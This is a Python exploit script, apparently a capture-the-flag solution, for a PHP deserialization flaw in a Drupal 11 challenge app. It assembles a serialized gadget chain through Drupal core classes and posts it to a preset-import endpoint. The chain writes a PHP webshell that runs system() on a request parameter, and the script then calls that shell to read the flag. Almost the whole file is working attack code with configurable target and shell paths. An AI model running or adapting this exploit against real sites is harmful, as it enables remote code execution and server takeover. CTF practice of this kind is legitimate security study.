#!/usr/bin/env python3
"""Crack a Little Smile (Drupal 11 / PHP 8.3) 反序列化利用脚本.

链: POST /api/presets/import 的 base64 "频录码" 被 unserialize()
    -> 顶层 ResonanceArchivePreset 加一个动态属性 x 携带 gadget
    -> YamlCacheCollectorDiscovery::__destruct()
       -> State::destruct() -> CacheCollector::updateCache()
          -> Container::get($cid) 里运行期 unserialize(serviceDefinitions[$cid])
             -> createService() -> call_user_func_array('file_put_contents', [...])
    -> 写入 /opt/drupal/web/sites/default/files/qwb.php
    -> GET qwb.php?c=/readflag 取 flag

脚本直接按 PHP serialize 格式拼串(不依赖 phpggc / PHP 环境), 属性名使用
protected 属性的 mangled 形式 \\0*\\0<name>.

用法:
    python exp.py --base http://TARGET
"""

import argparse
import base64
import json
import re

import requests

SHELL = '<?php echo "SHELLOK:"; echo system($_GET["c"]); ?>'

CID = "qwb_cid"
SHELL_PATH = "/opt/drupal/web/sites/default/files/qwb.php"
SHELL_URL = "/sites/default/files/qwb.php"


def s(value):
    """PHP 字符串; 长度按字节计."""
    data = value if isinstance(value, bytes) else value.encode()
    return b's:%d:"' % len(data) + data + b'";'


def i(value):
    return b"i:%d;" % value


def b(value):
    return b"b:%d;" % (1 if value else 0)


def obj(class_name, props):
    """props: [(prop_name, serialized_value), ...]; 属性名在这里统一序列化成字符串."""
    name = class_name.encode()
    body = b"".join(s(key) + value for key, value in props)
    return b'O:%d:"%s":%d:{' % (len(name), name, len(props)) + body + b"}"


def arr(pairs):
    """pairs: [(serialized_key, serialized_value), ...]."""
    return b"a:%d:{" % len(pairs) + b"".join(k + v for k, v in pairs) + b"}"


def protected(class_name, prop):
    return b"\x00*\x00" + prop.encode()


def private(class_name, prop):
    return b"\x00" + class_name.encode() + b"\x00" + prop.encode()


def build_payload(shell_path, cid):
    inner = arr([
        (s("factory"), s("file_put_contents")),
        (s("arguments"), arr([(i(0), s(shell_path)), (i(1), s(SHELL))])),
    ])

    container = obj(
        "Drupal\\Component\\DependencyInjection\\Container",
        [(protected("Container", "serviceDefinitions"), arr([(s(cid), s(inner))]))],
    )

    state = obj("Drupal\\Core\\State\\State", [
        (protected("State", "cid"), s(cid)),
        (protected("State", "tags"), b"a:0:{}"),
        (protected("State", "cache"), container),
        (protected("State", "lock"), obj("Drupal\\Core\\Lock\\NullLockBackend", [])),
        (protected("State", "keysToPersist"), arr([(s("k"), b("1"))])),
        (protected("State", "storage"), arr([(s("k"), s("v"))])),
        (protected("State", "cacheLoaded"), b(False)),
        (protected("State", "cacheInvalidated"), b(False)),
        (protected("State", "cacheCreated"), b"N;"),
    ])

    discovery = obj(
        "Drupal\\Core\\Discovery\\YamlCacheCollectorDiscovery",
        [(protected("YamlCacheCollectorDiscovery", "yamlCacheCollector"), state)],
    )

    preset = obj("ResonanceArchivePreset", [
        ("formatVersion", s("resonance-archive/1")),
        ("codename", s("test01")),
        ("fieldNote", s("hello")),
        ("band", s("band-01")),
        ("signalProfile", s("clean")),
        ("x", discovery),  # 动态属性: 只触发 E_DEPRECATED, 不中断反序列化
    ])
    return preset


def main():
    parser = argparse.ArgumentParser(description="Drupal 11 presets 反序列化 RCE")
    parser.add_argument("--base", default="http://TARGET", help="题目入口")
    parser.add_argument("--shell-path", default=SHELL_PATH, help="webshell 绝对路径")
    parser.add_argument("--shell-url", default=SHELL_URL, help="webshell URL 路径")
    parser.add_argument("--cid", default=CID, help="Container 的 cache id / 键名")
    parser.add_argument("--timeout", type=float, default=20.0)
    args = parser.parse_args()

    base = args.base.rstrip("/")
    session = requests.Session()

    payload = build_payload(args.shell_path, args.cid)
    code = base64.b64encode(payload).decode()
    print("[i] payload 长度 %d 字节 (base64 %d)" % (len(payload), len(code)))

    response = session.post(
        base + "/api/presets/import",
        json={"code": code},
        headers={"Content-Type": "application/json"},
        timeout=args.timeout,
    )
    print("[i] import -> %d %s" % (response.status_code, response.text[:300]))
    # 业务层通常返回 unreadable_preset, gadget 已在对象释放时执行, 属正常现象

    shell = session.get(
        base + args.shell_url, params={"c": "/readflag"}, timeout=args.timeout
    )
    print("----- webshell output -----")
    print(shell.text)
    print("---------------------------")

    if "SHELLOK:" not in shell.text:
        raise SystemExit("[-] webshell 未生效, 可用 --shell-path 调整落点后重试")

    match = re.search(r"flag\{[^}]*\}", shell.text)
    if match:
        print("[+] flag: " + match.group(0))
    else:
        print("[i] webshell 已执行, 但未匹配到 flag{; 可手动访问 %s?c=id 排查"
              % (base + args.shell_url))


if __name__ == "__main__":
    main()
